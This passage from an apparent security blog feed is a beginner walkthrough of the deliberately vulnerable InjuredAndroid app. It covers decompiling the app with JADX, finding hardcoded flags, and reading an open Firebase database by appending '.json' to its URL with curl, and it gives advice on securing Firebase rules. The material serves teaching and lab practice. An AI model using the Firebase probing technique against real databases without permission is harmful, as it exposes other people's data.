    &lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; d2&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
    d h &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; d2&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
    d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;h&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;database.child(refDirectory)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;y&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; h&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Decode the base64 encoded string in order to understand strings stored in the decode variable. To decode the string we use linux utility called base64.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vx@archie:~$ echo &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;ZmxhZ3Mv&amp;#34;&lt;/span&gt; | base64 -d
            flags/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the above analysis,we are getting data from firebase storage, in the &lt;strong&gt;flags&lt;/strong&gt; node.&lt;/p&gt;
&lt;p&gt;Clicking on the hint view button in the application, we get hint on how to solve the challenge level.
When the hint view is clicked it shows a string hint of &lt;strong&gt;&amp;ldquo;Use the .json trick database url&amp;rdquo;&lt;/strong&gt; as shown in the decompiled code below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;onClick&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
        String str&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;FlagNineFirebaseActivity&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;H&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;==&lt;/span&gt; 0&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
            &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;view &lt;span style=&#34;color:#5bc4bf&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
                str &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;Use the .json trick with database url&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
                d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;k&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
                &lt;span style=&#34;color:#815ba4&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;FlagNineFirebaseActivity&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;H&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;==&lt;/span&gt; 1&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
            &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;view &lt;span style=&#34;color:#5bc4bf&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
                str &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;Filenames.&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
                d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;k&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
                &lt;span style=&#34;color:#815ba4&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;firebase-realtime-rules&#34;&gt;Firebase Realtime Rules&lt;/h4&gt;
&lt;p&gt;Realtime database stores data as one large JSON tree and synchronized every time a new device is connected.The data received or stored in the database is determined by the security rules  of read and write.&lt;/p&gt;
&lt;p&gt;Firebase allows read and write rules to the database to be set to true or false. when &lt;strong&gt;.read&lt;/strong&gt; is set to true means describes if and data is allowed to be read by users and &lt;strong&gt;.write&lt;/strong&gt; describes if and when data is allowed to be written.
Example of a firebase rule where read and write are allowed.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;{
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;#34;rules&amp;#34;&lt;/span&gt;: {
        &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;#34;.read&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#815ba4&#34;&gt;true&lt;/span&gt;,
        &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;#34;.write&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#815ba4&#34;&gt;true&lt;/span&gt;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;When read and write rules are enabled means that everyone with access to the application can read and write unauthorized data to the database.&lt;/p&gt;
&lt;p&gt;The firebase database url is defined in &lt;strong&gt;strings.xml&lt;/strong&gt; file in the resource section.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;    &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;string&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;firebase_database_url&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;https://injuredandroid.firebaseio.com&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The firebase node defined in our instance is &lt;strong&gt;flags&lt;/strong&gt; node, to check if the endpoint node is vulnerable we append a &lt;strong&gt;.json&lt;/strong&gt; at the end of the url node as shown in the image below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vx@archie:injured$ curl https://injuredandroid.firebaseio.com/flags/.json
&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;[nine!_flag]&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If the url returns some data, that means that our endpoint is vulnerable. From the above output we were able to successfully solve the challenge.&lt;/p&gt;
&lt;h4 id=&#34;securing-firebase&#34;&gt;Securing Firebase&lt;/h4&gt;
&lt;p&gt;One can secure Firebase database by only allowing users of application to have only read permissions to a certain  tree node instead of allowing read to the root node in the application. This means the applications can not read data from the neighboring nodes.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;{
  &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;#34;rules&amp;#34;&lt;/span&gt;: {
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;: {
      &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;#34;.read&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#815ba4&#34;&gt;true&lt;/span&gt;,
      &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;#34;.write&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#815ba4&#34;&gt;false&lt;/span&gt;
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Android Application Security Series- Part 1</title>
        <link>https://thuri10.github.io/p/android-application-security-series-part-1/</link>
        <pubDate>Wed, 20 Oct 2021 20:19:29 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/android-application-security-series-part-1/</guid>
        <description>&lt;img src="https://thuri10.github.io/post/androidsec/android.jpg" alt="Featured image of post Android Application Security Series- Part 1" /&gt;&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;This is a five part beginner series of Android application security with Vulnerable Android application examples. The application used in the first three part series is a vulnerable Android application developed by &lt;a class=&#34;link&#34; href=&#34;https://twitter.com/B3nac&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;@B3nac&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The application is called &lt;em&gt;&lt;strong&gt;InjuredAndroid&lt;/strong&gt;&lt;/em&gt;, it covers different security concepts such as hardcoded secrets, weak cryptographic algorithms, misconfiguration, webview vulnerabilities etc. The application can be downloaded from the following provided links &lt;a class=&#34;link&#34; href=&#34;https://play.google.com/store/apps/details?id=b3nac.injuredandroid&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;playstore&lt;/a&gt; or &lt;a class=&#34;link&#34; href=&#34;https://github.com/B3nac/InjuredAndroid&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;github&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;For solving the challenges or following through the guides is you need to have an android phone or an emulator. For my case I will be using an android emulator throughout the series, my emulator of choice is android emulator which is part of android studio.&lt;/p&gt;
&lt;h3 id=&#34;enviroment-setup-and-decompilation&#34;&gt;Enviroment setup and decompilation&lt;/h3&gt;
&lt;p&gt;For installation of application to the emulator we will use Android debug bridge(adb). adb is a set of command line tools which are installed as part of android studio. adb enables communication between emulator/real android phone with the connected computer.&lt;/p&gt;
&lt;p&gt;To install the application, use install command as shown in the Linux terminal below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adb install InjuredAndroid-1.0.12-release.apk 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Launching the application in the emulator ,the interface will look like the image below.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/androidsec/android_injured.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/androidsec/android_injured.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;InjuredAndroid&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;InjuredAndroid&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Tools used throughout the series are:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/skylot/jadx&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;JADX&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Text Editor (visual studio)&lt;/li&gt;
&lt;li&gt;Android Studio&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;JADX is a bundle of command line and GUI tools. jadx enables one to produce java source code from android Dex and APK files. This tool will aid us to decompile the android application to java code which is human readable.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;For reverse engineering/ code auditing of every application, you need to have a clear set of goal or objective of what you want to achieve. This helps narrow down the analysis and avoid many rabbit holes.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;flag-one---login&#34;&gt;FLAG ONE - LOGIN&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Goal : Input the right flag.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;For the first challenge is to get the correct flag. &lt;strong&gt;flag&lt;/strong&gt; is a piece of reward if you do correct task you are asked to do. Looking at the decompiled code in the editor as shown below, there is an interesting function called &lt;strong&gt;submitFlag&lt;/strong&gt;. submit flag function is responsible for validation of the user input.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;submitFlag&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
        EditText editText &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;EditText&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;editText2&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        C2724g&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m882d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;editText&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;editText2&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;C2724g&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m885a&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;editText&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;getText&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(),&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;F1ag_0n3&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
            Intent intent &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; Intent&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; FlagOneSuccess&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; FlagsOverview&lt;span style=&#34;color:#5bc4bf&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m4085J&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; ApplicationC1492j&lt;span style=&#34;color:#5bc4bf&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m4065b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;flagOneButtonColor&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            startActivity&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;intent&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the above code, the &lt;strong&gt;FlagoneActivity&lt;/strong&gt; class implements a functionality which the user input is compared with hardcoded flag in the application.&lt;/p&gt;
&lt;p&gt;The user entered flag string is compared with the hardcoded flag which is &amp;ldquo;&lt;strong&gt;F1ag_0n3&lt;/strong&gt;&amp;rdquo;. The method &lt;strong&gt;m10785a&lt;/strong&gt; compares the two objects ( user input flag and hardcoded flag) and return a boolean depending on the result of the comparison of two objects. A boolean result can be either true or false.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;boolean&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;m10785a&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;Object obj&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; Object obj2&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;return&lt;/span&gt; obj &lt;span style=&#34;color:#5bc4bf&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;null&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;?&lt;/span&gt; obj2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;null&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;:&lt;/span&gt; obj&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;equals&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;obj2&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If the condition is True, new Intent is started which is &lt;strong&gt;FlagOneSuccess&lt;/strong&gt;. Entering hardcoded flag as our input, we get a success message and color of &lt;strong&gt;Flag1&lt;/strong&gt; in flagsOverview Activity changes to green, meaning we have successfully solved the challenge1.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/androidsec/solved.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/androidsec/solved.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;Flag one solved&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Flag one solved&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The flag for level1 is &amp;ldquo;&lt;strong&gt;F1ag_0n3&lt;/strong&gt;&amp;rdquo;.&lt;br&gt;
For other levels if solved successfully, the color of the flag corresponding to that level will change to green.&lt;/p&gt;
&lt;h2 id=&#34;flag-two---exported-activity&#34;&gt;FLAG TWO - EXPORTED ACTIVITY&lt;/h2&gt;
&lt;p&gt;Goal : &lt;strong&gt;There is a way to  bypass the main activity and invoke other activities that are exported.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;What is an activity?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;An activity is a single, focused thing that the user can do. It is an application component that provide a user Interface for users to interact with.&lt;/p&gt;
&lt;p&gt;Looking at the &lt;strong&gt;flagtwoactivity&lt;/strong&gt;, the source code looks like the one shown below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;FlagTwoActivity&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;extends&lt;/span&gt; ActivityC0453c &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;

    &lt;span style=&#34;color:#776e71&#34;&gt;/* renamed from: w */&lt;/span&gt;
    &lt;span style=&#34;color:#fec418&#34;&gt;int&lt;/span&gt; f4461w &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;

    &lt;span style=&#34;color:#776e71&#34;&gt;/* renamed from: F */&lt;/span&gt;
